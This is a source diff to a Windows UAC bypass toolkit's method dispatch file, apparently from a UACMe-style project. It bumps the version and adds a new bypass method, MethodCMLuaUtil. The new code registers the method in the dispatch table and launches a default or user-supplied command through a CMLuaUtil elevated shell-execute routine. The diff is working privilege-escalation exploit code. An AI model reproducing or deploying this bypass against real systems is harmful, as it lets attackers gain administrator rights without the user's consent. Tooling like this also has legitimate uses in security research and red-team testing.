@@ -4,9 +4,9 @@
 *
 *  TITLE:       METHODS.C
 *
-*  VERSION:     2.78
+*  VERSION:     2.79
 *
-*  DATE:        30 July 2017
+*  DATE:        16 Aug 2017
 *
 *  UAC bypass dispatch.
 *
@@ -52,6 +52,7 @@ UCM_API(MethodSXSDccw);
 UCM_API(MethodHakril);
 UCM_API(MethodCorProfiler);
 UCM_API(MethodCOMHandlers);
+UCM_API(MethodCMLuaUtil);
 
 UCM_API_DISPATCH_ENTRY ucmMethodsDispatchTable[UCM_DISPATCH_ENTRY_MAX] = {
     { MethodTest, NULL, { 7600, MAXDWORD }, FUBUKI_ID, FALSE, TRUE, TRUE },
@@ -94,7 +95,8 @@ UCM_API_DISPATCH_ENTRY ucmMethodsDispatchTable[UCM_DISPATCH_ENTRY_MAX] = {
     { MethodSXSDccw, NULL, { 7600, MAXDWORD }, FUBUKI_ID, FALSE, TRUE, TRUE },
     { MethodHakril, NULL, { 7600, MAXDWORD }, FUBUKI_ID, FALSE, TRUE, TRUE },
     { MethodCorProfiler, NULL, { 7600, MAXDWORD }, FUBUKI_ID, FALSE, TRUE, TRUE },
-    { MethodCOMHandlers, NULL, { 7600, MAXDWORD }, FUBUKI_ID, FALSE, TRUE, TRUE }
+    { MethodCOMHandlers, NULL, { 7600, MAXDWORD }, FUBUKI_ID, FALSE, TRUE, TRUE },
+    { MethodCMLuaUtil, NULL, { 7600, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, TRUE, FALSE }
 };
 
 /*
@@ -743,4 +745,25 @@ UCM_API(MethodCOMHandlers)
     UNREFERENCED_PARAMETER(ExtraContext);
 
     return ucmMethodCOMHandlers(PayloadCode, PayloadSize);
+}
+
+UCM_API(MethodCMLuaUtil)
+{
+    WCHAR szBuffer[MAX_PATH + 1];
+
+    UNREFERENCED_PARAMETER(Method);
+    UNREFERENCED_PARAMETER(ExtraContext);
+    UNREFERENCED_PARAMETER(PayloadCode);
+    UNREFERENCED_PARAMETER(PayloadSize);
+
+    //
+    // Select target application or use given by optional parameter.
+    //
+    RtlSecureZeroMemory(szBuffer, sizeof(szBuffer));
+    if (g_ctx.OptionalParameterLength == 0)
+        supExpandEnvironmentStrings(T_DEFAULT_CMD, szBuffer, MAX_PATH);
+    else
+        _strcpy(szBuffer, g_ctx.szOptionalParameter);
+
+    return ucmCMLuaUtilShellExecMethod(szBuffer);
 }
